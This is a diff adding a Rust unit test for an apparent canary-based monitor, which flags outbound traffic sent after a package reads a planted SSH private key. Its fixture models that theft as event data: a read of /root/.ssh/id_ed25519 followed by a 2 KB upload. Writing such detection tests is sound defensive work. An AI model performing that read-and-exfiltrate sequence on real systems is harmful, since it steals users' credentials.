+    fn only_what_left_after_the_first_look_at_a_bait_is_counted() {
+        use serde_json::json;
+        let cans = vec![Canary { path: ".ssh/id_ed25519".into(), what: "SSH private key", group: crate::canary::PRIVATE, mark: "m".into() }];
+        let conn = |t: i64, ip: &str| json!({"kind":"connect","t":t,"pid":1,"ip":ip,"port":443});
+        let close = |ip: &str, sent: u64| json!({"kind":"close","t":900,"pid":1,"ip":ip,"port":443,"sent":sent,"received":0});
+        let a = Activity::from_events(&[
+            conn(50, "10.0.0.1"), close("10.0.0.1", 5000), // the apt download, before
+            json!({"kind":"open","t":100,"pid":1,"comm":"cat","path":"/root/.ssh/id_ed25519","mode":"read","create":false}),
+            conn(200, "10.0.0.2"), close("10.0.0.2", 2048),
+        ], false);
+        let f = vec![Finding { kind: Kind::Secret, path: "~/.ssh/id_ed25519".into(), did: vec!["read"], why: String::new(), by: vec![], group: crate::canary::PRIVATE, count: 1, package: String::new(), lines: vec![] }];
+        let s = in_short(&f, Some(&a), &cans, None);
+        assert!(s.contains("After reading your secrets it sent 2.0 KB to 10.0.0.2.") && !s.contains("10.0.0.1."), "{s}");
+    }
+}
